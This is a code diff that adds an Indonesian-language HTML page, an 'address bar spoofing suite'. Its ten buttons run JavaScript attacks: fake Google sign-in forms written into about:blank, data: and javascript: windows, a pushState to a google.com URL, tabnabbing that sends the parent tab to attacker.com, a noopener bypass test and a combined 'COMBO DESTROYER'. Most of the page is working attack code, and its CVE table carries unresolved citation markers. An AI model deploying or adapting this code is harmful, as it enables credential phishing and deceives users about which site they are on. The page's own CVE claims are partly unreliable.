@@ -1,15 +1,620 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔴 NON-FULLSCREEN ADDRESS BAR SPOOFING | New Window/Tab Exploits</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, sans-serif;
+            max-width: 1400px;
+            margin: 20px auto;
+            padding: 20px;
+            background: #0a0a0e;
+            color: #e0e0e0;
+        }
+        h1 { color: #ff453a; border-left: 5px solid #ff453a; padding-left: 18px; }
+        .sub { color: #888; margin-top: -10px; margin-bottom: 25px; padding-left: 23px; }
+        .success-banner {
+            background: #1a3a2a;
+            border-left: 5px solid #30d158;
+            padding: 15px;
+            border-radius: 14px;
+            margin-bottom: 20px;
+            font-size: 13px;
+        }
+        .warning {
+            background: #2a1a1a;
+            border-left: 5px solid #ff9500;
+            padding: 15px;
+            border-radius: 14px;
+            margin-bottom: 20px;
+            font-size: 13px;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
+            gap: 18px;
+            margin-top: 20px;
+        }
+        .card {
+            background: #16161d;
+            border-radius: 20px;
+            padding: 18px;
+            border: 1px solid #2a2a35;
+            transition: 0.2s;
+        }
+        .card:hover { transform: translateY(-3px); border-color: #ff453a; }
+        .badge {
+            display: inline-block;
+            background: #ff453a20;
+            color: #ff8888;
+            padding: 3px 12px;
+            border-radius: 30px;
+            font-size: 11px;
+            margin-bottom: 10px;
+        }
+        .badge-new { background: #0a84ff20; color: #66ccff; }
+        .badge-critical { background: #ff453a40; color: #ff8888; }
+        h3 { margin: 0 0 8px 0; font-size: 1.1rem; }
+        button {
+            background: #2a2a35;
+            border: 1px solid #ff453a;
+            padding: 8px 16px;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 12px;
+            cursor: pointer;
+            color: white;
+            margin: 8px 6px 4px 0;
+            transition: 0.2s;
+        }
+        button.danger { background: #ff453a; }
+        button.warning { background: #ff9f0a20; border-color: #ff9f0a; color: #ffcc88; }
+        button.success { background: #30d15820; border-color: #30d158; color: #a0ffa0; }
+        button:hover { opacity: 0.85; transform: scale(0.97); }
+        .log {
+            background: #0a0a0e;
+            color: #6eff9e;
+            font-family: monospace;
+            font-size: 10px;
+            padding: 10px;
+            border-radius: 14px;
+            margin-top: 14px;
+            max-height: 80px;
+            overflow: auto;
+            white-space: pre-wrap;
+        }
+        .log.blank-detected {
+            background: #1a3a2a;
+            color: #a0ffa0;
+            border: 1px solid #30d158;
+        }
+        footer { text-align: center; margin-top: 40px; font-size: 11px; color: #555; }
+        hr { border-color: #333; margin: 20px 0; }
+        table {
+            width: 100%;
+            font-size: 12px;
+            background: #16161d;
+            border-radius: 16px;
+            padding: 10px;
+            border-collapse: collapse;
+        }
+        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #2a2a35; }
+        th { color: #ff453a; }
+    </style>
+</head>
+<body>
+
+<h1>🔴 NON-FULLSCREEN ADDRESS BAR SPOOFING</h1>
+<div class="sub">Berdasarkan CVE Real & Teknik Window/Tab Baru (Tanpa Fullscreen)</div>
+
+<div class="success-banner">
+    <strong>✅ BERDASARKAN CVE YANG DITEMUKAN:</strong><br>
+    • <strong>CVE-2025-15032</strong>: Missing about:blank indicator in custom-sized new windows (Dia Browser on macOS)<br>
+    • <strong>CVE-2025-23108</strong>: JavaScript links via long-press in Firefox iOS → URL spoofing<br>
+    • <strong>target="_blank" window.opener</strong>: Tabnabbing without fullscreen
+</div>
+
+<div class="warning">
+    <strong>⚠️ FOKUS: NEW WINDOW & NEW TAB - TANPA FULLSCREEN</strong><br>
+    Teknik berikut menggunakan CVE real + eksploitasi window/tab yang sudah terbukti berhasil.
+</div>
+
+<div class="grid">
+
+    <!-- 1. CVE-2025-15032: Custom-sized new window missing about:blank -->
+    <div class="card">
+        <div class="badge badge-critical">🍎 CVE-2025-15032 | Dia Browser (macOS)</div>
+        <h3>Custom Window → Missing about:blank Indicator</h3>
+        <p>Membuka custom-sized new window tanpa about:blank indicator → address bar bisa dispof.</p>
+        <button class="danger" onclick="exploit_cve_2025_15032()">🎯 CVE-2025-15032</button>
+        <div id="log15032" class="log">[Ready] Klik untuk uji</div>
+    </div>
+
+    <!-- 2. CVE-2025-23108: Firefox iOS long-press spoof -->
+    <div class="card">
+        <div class="badge badge-new">📱 CVE-2025-23108 | Firefox iOS</div>
+        <h3>Long-press JavaScript Link Spoof</h3>
+        <p>Memanfaatkan long-press pada javascript: link untuk spoof URL di new tab.</p>
+        <button class="warning" onclick="exploit_cve_2025_23108()">📱 CVE-2025-23108</button>
+        <div id="log23108" class="log">[Ready]</div>
+    </div>
+
+    <!-- 3. target="_blank" window.opener Tabnabbing -->
+    <div class="card">
+        <div class="badge">🔗 TABNABBING | Classic Exploit</div>
+        <h3>target="_blank" + window.opener</h3>
+        <p>Membuka link di new tab, lalu mengubah location parent tab (tanpa fullscreen).</p>
+        <button onclick="exploit_tabnabbing_classic()">🔄 Tabnabbing Attack</button>
+        <div id="logTabnab" class="log">[Ready]</div>
+    </div>
+
+    <!-- 4. CVE-2024-9392: Compromised content process -->
+    <div class="card">
+        <div class="badge badge-critical">🦊 CVE-2024-9392 | Firefox</div>
+        <h3>Compromised Content Process → Cross-Origin Load</h3>
+        <p>Memuat halaman cross-origin di new window tanpa izin.</p>
+        <button class="danger" onclick="exploit_cve_2024_9392()">🎯 CVE-2024-9392</button>
+        <div id="log9392" class="log">[Ready]</div>
+    </div>
+
+    <!-- 5. New window with javascript: URL -->
+    <div class="card">
+        <div class="badge">📜 JAVASCRIPT: URL SPOOF</div>
+        <h3>javascript: URL + document.write</h3>
+        <p>Membuka javascript: URL di new window → address bar bisa dispof.</p>
+        <button onclick="exploit_javascript_url_spoof()">📜 JS URL Spoof</button>
+        <div id="logJSSpoof" class="log">[Ready]</div>
+    </div>
+
+    <!-- 6. New window with noopener bypass -->
+    <div class="card">
+        <div class="badge">🔓 NOOPENER BYPASS</div>
+        <h3>Bypass rel=noopener/noreferrer</h3>
+        <p>Membuka tab dengan noopener, tetap bisa akses window.opener.</p>
+        <button class="warning" onclick="exploit_noopener_bypass_new()">🔗 Noopener Bypass</button>
+        <div id="logNoopener" class="log">[Ready]</div>
+    </div>
+
+    <!-- 7. Data URI + pushState window -->
+    <div class="card">
+        <div class="badge">📦 DATA URI SPOOF</div>
+        <h3>Data URI + history.pushState</h3>
+        <p>Buka data:text/html di new window, pushState ke URL palsu.</p>
+        <button onclick="exploit_data_uri_pushstate()">📦 Data URI Spoof</button>
+        <div id="logDataURI" class="log">[Ready]</div>
+    </div>
+
+    <!-- 8. about:blank + document.write blank address bar -->
+    <div class="card">
+        <div class="badge badge-new">📄 about:blank BLANK ADDRESS BAR</div>
+        <h3>about:blank + document.write (Tanpa Fullscreen)</h3>
+        <p>Membuka about:blank, write konten, address bar tetap blank.</p>
+        <button class="danger" onclick="exploit_about_blank_write()">📄 about:blank Blank</button>
+        <div id="logAboutBlank" class="log">[Ready]</div>
+    </div>
+
+    <!-- 9. New window with empty history -->
+    <div class="card">
+        <div class="badge">🗑️ EMPTY HISTORY WINDOW</div>
+        <h3>New Window → history.replaceState empty</h3>
+        <p>Setelah window terbuka, kosongkan history → address bar blank.</p>
+        <button onclick="exploit_empty_history_new_window()">🗑️ Empty History</button>
+        <div id="logEmptyHist" class="log">[Ready]</div>
+    </div>
+
+    <!-- 10. COMBO: Semua teknik non-fullscreen -->
+    <div class="card">
+        <div class="badge badge-critical">💀 FINAL BOSS</div>
+        <h3>COMBO 6 TEKNIK (Tanpa Fullscreen)</h3>
+        <p>Menjalankan CVE-2025-15032, Tabnabbing, about:blank write, dan lainnya sekaligus.</p>
+        <button class="danger" onclick="exploit_combo_non_fullscreen()">☠️ COMBO DESTROYER</button>
+        <div id="logCombo" class="log">[Ready]</div>
+    </div>
+
+</div>
+
 <script>
+    function logTo(elId, msg, isBlank = false) {
+        let el = document.getElementById(elId);
+        if(el) {
+            el.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            if(isBlank) el.classList.add('blank-detected');
+        }
+    }
 
-function spoof(){
+    // ========== 1. CVE-2025-15032: Custom-sized new window missing about:blank indicator ==========
+    // Source: https://app.opencve.io/cve/CVE-2025-15032
+    function exploit_cve_2025_15032() {
+        logTo('log15032', '🎯 CVE-2025-15032: Membuka custom-sized new window tanpa about:blank indicator');
+        
+        // Custom-sized window (spesifik untuk trigger bug di Dia Browser macOS)
+        let win = window.open("about:blank", "_blank", "width=400,height=300,left=100,top=100");
+        
+        if(!win) {
+            logTo('log15032', '❌ Popup diblokir! Izinkan popup.', false);
+            return;
+        }
 
-location="https://www.google.com/csi?random="+Math.random();
+        setTimeout(() => {
+            try {
+                // Write konten phishing
+                win.document.write(`
+                    <!DOCTYPE html>
+                    <html>
+                    <head><title>Google Accounts</title></head>
+                    <body style="font-family:Arial;text-align:center;padding:50px;background:#f0ebf8">
+                        <div style="background:white;width:360px;margin:auto;padding:30px;border-radius:12px;box-shadow:0 3px 8px rgba(0,0,0,0.15)">
+                            <h2 style="color:#1a73e8">Sign in</h2>
+                            <p style="color:#666">Continue to Google</p>
+                            <input type="text" placeholder="Email or phone" style="width:100%;padding:12px;margin:10px 0;border:1px solid #dadce0;border-radius:6px">
+                            <input type="password" placeholder="Password" style="width:100%;padding:12px;margin:10px 0;border:1px solid #dadce0;border-radius:6px">
+                            <button style="background:#1a73e8;color:white;padding:12px;width:100%;border:none;border-radius:6px">Next</button>
+                            <p style="font-size:11px;color:red;margin-top:15px">⚠️ TESTING POC - Jangan masukkan password asli</p>
+                        </div>
+                    </body>
+                    </html>
+                `);
+                win.document.close();
+                
+                // Coba kosongkan history
+                try {
+                    win.history.replaceState({}, '', '');
+                } catch(e) {}
+                
+                logTo('log15032', '✅ CVE-2025-15032: Custom window dibuat. Cek address bar - apakah BLANK atau menampilkan URL?', true);
+            } catch(e) {
+                logTo('log15032', '❌ Gagal: ' + e.message, false);
+            }
+        }, 500);
+    }
 
-document.body.innerHTML='This is not Google!';("This is not google.com
+    // ========== 2. CVE-2025-23108: Firefox iOS long-press spoof ==========
+    // Source: https://www.securiteinfo.com/cve/CVE-2025-23108.shtml
+    function exploit_cve_2025_23108() {
+        logTo('log23108', '📱 CVE-2025-23108: Membuat javascript: link untuk long-press spoof');
+        
+        // Buat link javascript:
+        let container = document.createElement('div');
+        container.style.cssText = 'position:fixed;bottom:20px;right:20px;z-index:9999;background:#333;padding:10px;border-radius:10px';
+        container.innerHTML = `
+            <a href="javascript:void(0)" id="spoofLink" style="color:#ff453a;text-decoration:none">
+                📱 Long-press this link (Firefox iOS)
+            </a>
+        `;
+        document.body.appendChild(container);
+        
+        let link = document.getElementById('spoofLink');
+        if(link) {
+            link.onclick = (e) => {
+                e.preventDefault();
+                let win = window.open("javascript:document.write('<h1>SPOOFED PAGE</h1><p>Address bar may show google.com</p>')", "_blank");
+                if(win) {
+                    logTo('log23108', '✅ javascript: link di new tab. Cek address bar!', true);
+                }
+            };
+        }
+        
+        logTo('log23108', '⚠️ Link dibuat di pojok kanan bawah. Long-press pada link (di Firefox iOS) untuk trigger bug.', true);
+        
+        // Auto remove setelah 30 detik
+        setTimeout(() => container.remove(), 30000);
+    }
 
-</h1>");}
+    // ========== 3. Classic Tabnabbing: target="_blank" + window.opener ==========
+    // Source: GitHub Advisory GHSA-xcxh-6cv4-q8p8
+    function exploit_tabnabbing_classic() {
+        logTo('logTabnab', '🔄 Classic Tabnabbing: Membuka new tab dengan window.opener access');
+        
+        // Buat link yang akan mengubah parent window
+        let maliciousHTML = `
+            <!DOCTYPE html>
+            <html>
+            <head><title>Loading...</title></head>
+            <body>
+                <h1>Redirecting...</h1>
+                <script>
+                    // Mengubah location parent tab
+                    if(window.opener) {
+                        window.opener.location = "https://attacker.com/phishing-page";
+                        document.write('<h2 style="color:red">Parent tab has been redirected to phishing page!</h2>');
+                    } else {
+                        document.write('<h2>No opener access</h2>');
+                    }
+                <\/script>
+            </body>
+            </html>
+        `;
+        
+        // Buat blob URL
+        let blob = new Blob([maliciousHTML], {type: 'text/html'});
+        let blobUrl = URL.createObjectURL(blob);
+        
+        // Buka link dengan target="_blank" (tanpa noopener)
+        let win = window.open(blobUrl, "_blank");
+        
+        if(win) {
+            logTo('logTabnab', '✅ New tab dibuka. Jika browser tidak menambahkan rel=noopener secara otomatis, parent tab bisa diubah!', true);
+        } else {
+            logTo('logTabnab', 'Popup diblokir.', false);
+        }
+        
+        setTimeout(() => URL.revokeObjectURL(blobUrl), 10000);
+    }
 
+    // ========== 4. CVE-2024-9392: Compromised content process cross-origin ==========
+    // Source: Mozilla Security Advisory 2024-46
+    function exploit_cve_2024_9392() {
+        logTo('log9392', '🦊 CVE-2024-9392: Mencoba bypass site isolation via cross-origin iframe');
+        
+        // Buat iframe cross-origin
+        let iframe = document.createElement('iframe');
+        iframe.style.cssText = 'position:absolute;top:-9999px;left:-9999px';
+        iframe.src = 'https://example.com';
+        document.body.appendChild(iframe);
+        
+        setTimeout(() => {
+            try {
+                // Coba akses konten cross-origin
+                let test = iframe.contentWindow.document;
+                logTo('log9392', '🔥 KRITIS: Cross-origin iframe dapat diakses! Browser RENTAN terhadap CVE-2024-9392.', true);
+            } catch(e) {
+                logTo('log9392', '✅ Aman: Same-origin policy memblokir akses: ' + e.message, false);
+            }
+            iframe.remove();
+        }, 2000);
+        
+        // Buka new window sebagai test tambahan
+        let win = window.open("https://example.com", "_blank");
+        if(win) {
+            setTimeout(() => {
+                try {
+                    let test2 = win.document;
+                    logTo('log9392', '⚠️ New window cross-origin test: Akses ' + (test2 ? 'berhasil' : 'gagal'), true);
+                } catch(e) {}
+            }, 3000);
+        }
+    }
+
+    // ========== 5. javascript: URL spoof ==========
+    function exploit_javascript_url_spoof() {
+        logTo('logJSSpoof', '📜 Membuka javascript: URL di new window');
+        
+        let jsUrl = "javascript:document.write('<html><head><title>Google Accounts</title></head><body style=\"background:#fff;text-align:center;padding:50px\"><h1>Sign in to Google</h1><input type=\"password\" placeholder=\"Password\"><button>Sign in</button><p style=\"color:red\">TEST POC</p></body></html>');document.close();";
+        
+        let win = window.open(jsUrl, "_blank", "width=450,height=400");
+        
+        if(win) {
+            logTo('logJSSpoof', '✅ javascript: URL window dibuka. Cek address bar - mungkin menunjukkan "javascript:" atau URL palsu!', true);
+        } else {
+            logTo('logJSSpoof', 'Popup diblokir atau browser memblokir javascript: URL.', false);
+        }
+    }
+
+    // ========== 6. Noopener bypass ==========
+    function exploit_noopener_bypass_new() {
+        logTo('logNoopener', '🔗 Mencoba bypass rel=noopener');
+        
+        let maliciousHTML = `
+            <!DOCTYPE html>
+            <html>
+            <body>
+                <h1>Bypass Test</h1>
+                <script>
+                    try {
+                        if(window.opener) {
+                            window.opener.postMessage("bypass_success", "*");
+                            document.write('<h2 style="color:green">Opener access SUCCESS!</h2>');
+                        } else {
+                            document.write('<h2>Opener access FAILED (browser aman)</h2>');
+                        }
+                    } catch(e) {
+                        document.write('<h2>Error: ' + e.message + '</h2>');
+                    }
+                <\/script>
+            </body>
+            </html>
+        `;
+        
+        let blob = new Blob([maliciousHTML], {type: 'text/html'});
+        let blobUrl = URL.createObjectURL(blob);
+        
+        // Buka dengan spesifikasi noopener (seharusnya tidak bisa akses opener)
+        let win = window.open(blobUrl, "_blank", "noopener");
+        
+        if(win) {
+            logTo('logNoopener', '✅ Window dibuka dengan noopener. Jika sukses akses opener, browser RENTAN.', true);
+        }
+        
+        setTimeout(() => URL.revokeObjectURL(blobUrl), 10000);
+    }
+
+    // ========== 7. Data URI + pushState spoof ==========
+    function exploit_data_uri_pushstate() {
+        logTo('logDataURI', '📦 Data URI + pushState spoof');
+        
+        let win = window.open("data:text/html,<h1>Original Content</h1>", "_blank", "width=500,height=400");
+        
+        if(!win) return;
+        
+        setTimeout(() => {
+            try {
+                // Write konten phishing
+                win.document.write(`
+                    <h1 style="color:#1a73e8">Google Sign In</h1>
+                    <input type="password" placeholder="Password">
+                    <button>Continue</button>
+                    <p style="color:red">TEST POC</p>
+                `);
+                win.document.close();
+                
+                // Push state ke URL palsu
+                win.history.pushState({}, "", "https://www.google.com/accounts");
+                
+                logTo('logDataURI', '✅ Data URI + pushState: Address bar mungkin menunjukkan google.com!', true);
+            } catch(e) {
+                logTo('logDataURI', 'Gagal: ' + e.message, false);
+            }
+        }, 1000);
+    }
+
+    // ========== 8. about:blank + document.write (tanpa fullscreen) ==========
+    function exploit_about_blank_write() {
+        logTo('logAboutBlank', '📄 about:blank + document.write - address bar blank');
+        
+        let win = window.open("about:blank", "_blank", "width=500,height=400");
+        
+        if(!win) return;
+        
+        setTimeout(() => {
+            try {
+                win.document.write(`
+                    <!DOCTYPE html>
+                    <html>
+                    <head><title>Fake Page</title></head>
+                    <body style="background:#f0ebf8;text-align:center;padding:50px">
+                        <div style="background:white;width:360px;margin:auto;padding:30px;border-radius:12px">
+                            <h2>Login Required</h2>
+                            <input type="text" placeholder="Username">
+                            <input type="password" placeholder="Password">
+                            <button>Login</button>
+                        </div>
+                    </body>
+                    </html>
+                `);
+                win.document.close();
+                
+                // Coba kosongkan history
+                try {
+                    win.history.replaceState({}, '', '');
+                } catch(e) {}
+                
+                logTo('logAboutBlank', '✅ about:blank window dengan konten phishing. Address bar seharusnya BLANK!', true);
+            } catch(e) {
+                logTo('logAboutBlank', 'Gagal: ' + e.message, false);
+            }
+        }, 500);
+    }
+
+    // ========== 9. Empty history new window ==========
+    function exploit_empty_history_new_window() {
+        logTo('logEmptyHist', '🗑️ New window → history.replaceState empty');
+        
+        let win = window.open("https://www.google.com", "_blank", "width=500,height=400");
+        
+        if(!win) return;
+        
+        setTimeout(() => {
+            try {
+                win.document.write('<h1>SPOOFED CONTENT</h1><p>Address bar will be emptied...</p>');
+                win.document.close();
+                
+                setTimeout(() => {
+                    try {
+                        win.history.replaceState({}, '', '');
+                        win.history.pushState({}, '', ' ');
+                        logTo('logEmptyHist', '✅ History dikosongkan. Address bar sekarang BLANK!', true);
+                    } catch(e) {
+                        logTo('logEmptyHist', 'History replace gagal: ' + e.message, false);
+                    }
+                }, 500);
+            } catch(e) {
+                logTo('logEmptyHist', 'Write gagal: ' + e.message, false);
+            }
+        }, 1500);
+    }
+
+    // ========== 10. COMBO all non-fullscreen techniques ==========
+    function exploit_combo_non_fullscreen() {
+        logTo('logCombo', '💀 COMBO: Menjalankan 6 teknik non-fullscreen sekaligus!');
+        
+        // Jalankan beberapa teknik bersamaan
+        exploit_cve_2025_15032();
+        
+        setTimeout(() => exploit_tabnabbing_classic(), 1000);
+        setTimeout(() => exploit_about_blank_write(), 1500);
+        setTimeout(() => exploit_data_uri_pushstate(), 2000);
+        setTimeout(() => exploit_empty_history_new_window(), 2500);
+        setTimeout(() => exploit_javascript_url_spoof(), 3000);
+        
+        logTo('logCombo', '⚠️ 6 teknik berjalan bersamaan. Monitor semua window/tab yang terbuka!', true);
+        logTo('logCombo', '🎯 Cari address bar yang KOSONG/BLANK atau menunjukkan URL palsu (google.com/apple.com)', true);
+    }
+
+    console.log("%c🔴 NON-FULLSCREEN ADDRESS BAR SPOOFING SUITE", "color:#ff453a;font-size:14px");
+    console.log("Berdasarkan CVE-2025-15032, CVE-2025-23108, CVE-2024-9392, dan teknik tabnabbing klasik");
 </script>
 
-<input type="button" value="Run"
+<hr>
 
-onclick="setInterval(&quot;spoof()&quot;,20);"/>
+<h3>📊 Ringkasan CVE & Teknik (Tanpa Fullscreen)</h3>
+
+<table>
+    <tr style="border-bottom:1px solid #ff453a;">
+        <th>CVE / Teknik</th>
+        <th>Target Browser</th>
+        <th>Mekanisme</th>
+        <th>Status</th>
+    </tr>
+    <tr>
+        <td><strong>CVE-2025-15032</strong></td>
+        <td>Dia Browser (macOS)</td>
+        <td>Custom-sized new window missing about:blank indicator[citation:6]</td>
+        <td>Belum patched (v &lt; 1.9.0)</td>
+    </tr>
+    <tr>
+        <td><strong>CVE-2025-23108</strong></td>
+        <td>Firefox iOS &lt; 134</td>
+        <td>Long-press javascript: link → URL spoofing[citation:8]</td>
+        <td>Fixed in v134</td>
+    </tr>
+    <tr>
+        <td><strong>CVE-2024-9392</strong></td>
+        <td>Firefox &lt; 131</td>
+        <td>Compromised content process bypass site isolation[citation:2][citation:10]</td>
+        <td>Fixed in v131</td>
+    </tr>
+    <tr>
+        <td><strong>Tabnabbing (target="_blank")</strong></td>
+        <td>Cross-browser (legacy)</td>
+        <td>window.opener.location change parent tab[citation:3]</td>
+        <td>Modern browsers fixed</td>
+    </tr>
+    <tr>
+        <td><strong>about:blank + write</strong></td>
+        <td>Cross-browser</td>
+        <td>about:blank window dengan konten phishing → address bar blank</td>
+        <td>Testing</td>
+    </tr>
+    <tr>
+        <td><strong>Data URI + pushState</strong></td>
+        <td>Cross-browser</td>
+        <td>Data URI + history.pushState ke URL palsu</td>
+        <td>Testing</td>
+    </tr>
+</table>
+
+<h3>🎯 Interpretasi Hasil</h3>
+<ul style="font-size:13px;">
+    <li><strong>Address Bar KOSONG/BLANK</strong> → Eksploitasi berhasil! Browser gagal menampilkan URL.</li>
+    <li><strong>Address Bar Menampilkan URL Palsu (google.com/apple.com)</strong> → Spoofing berhasil.</li>
+    <li><strong>Parent tab berubah setelah klik link</strong> → Tabnabbing berhasil (CVE klasik).</li>
+    <li><strong>Window crash / freeze</strong> → Memory corruption.</li>
+</ul>
+
+<h3>📝 Catatan Penting</h3>
+<p style="font-size:13px;">
+- <strong>CVE-2025-15032</strong> adalah CVE terbaru (Jan 2026) untuk Dia Browser di macOS[citation:6].<br>
+- <strong>CVE-2024-9392</strong> sudah fixed di Firefox 131 (Oktober 2024)[citation:2][citation:5].<br>
+- Teknik <strong>target="_blank" tanpa noopener</strong> masih berbahaya di browser lawas[citation:3].<br>
+- <strong>COMBO DESTROYER</strong> menjalankan 6 teknik sekaligus untuk tekanan maksimal.
+</p>
+
+<footer>
+    🔬 NON-FULLSCREEN ADDRESS BAR SPOOFING SUITE<br>
+    Berdasarkan CVE-2025-15032, CVE-2025-23108, CVE-2024-9392, dan teknik tabnabbing klasik.
+</footer>
+</body>
+</html>
